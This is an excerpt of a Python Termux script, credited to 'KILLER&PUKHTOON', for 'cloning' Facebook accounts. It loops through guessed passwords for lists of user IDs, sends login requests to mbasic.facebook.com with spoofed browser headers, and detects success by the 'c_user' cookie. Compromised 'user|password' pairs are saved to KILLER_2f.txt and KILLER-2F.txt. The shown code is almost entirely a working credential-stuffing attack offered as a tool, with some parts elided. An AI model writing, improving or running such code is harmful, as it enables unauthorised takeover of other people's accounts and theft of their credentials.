...
╚══════════════╝                              
\33[1;37m-----------------------------------------------
[+] Author  : KILLER&PUKHTOON 
[+] Version : \33[1;31m0.1
\33[1;37m-----------------------------------------------\nThis Tools Created By PAKTHOON&KILLERTOOLS Enjoy This Tool \n\33[1;37m-------------------------------------------------------
\33[1;37m   \33[1;31mDon't Minimize Termux duraning Cloning
\33[1;37m-------------------------------------------------------"""
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[OK] {loop}|{len(self.id)} \33[1;32m[OK][{len(ok)}] \33[1;36m[2f][{len(cp)}]\33[1;37m ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header1 = {'authority': 'mbasic.facebook.com',
    ...
    'viewport-width': '980',
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        # print('\r%s\33[1;36m [CHARIS-2F] %s|%s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('KILLER_2f.txt' , 'a').write('%s\n' % wrt)
                        break
                        ...
                        pass
                    # print('\r%s\33[1;36m [CHRIS-2F] %s|%s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('KILLER-2F.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
